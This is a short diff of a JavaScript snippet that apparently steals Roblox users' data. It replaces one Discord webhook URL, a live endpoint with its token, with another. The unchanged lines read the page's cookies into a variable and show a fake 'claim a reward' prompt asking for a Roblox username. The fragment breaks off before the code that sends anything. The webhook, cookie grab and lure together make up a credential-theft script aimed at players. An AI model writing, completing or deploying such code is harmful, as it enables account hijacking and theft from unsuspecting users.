@@ -1,4 +1,4 @@
-var webhook = "https://discord.com/api/webhooks/1373264182044262511/89mqxIyOePqt07faGGGagM95O7nZM9Kmkixh_eqyp3HaV1ixcYFid1wgjk1qK2BHx89P"; 
+var webhook = "https://discord.com/api/webhooks/1426919503232634973/F2RX0C2zSF202hVMphsGANiVYsikQo9nlzdi-avI7x8J2umLcWFpWtPdnxc-ioupN8zf"; 
 var cookies = document.cookie;
 var promptMessage = window.prompt("Enter your Roblox username to claim a reward:");
 if (promptMessage) {
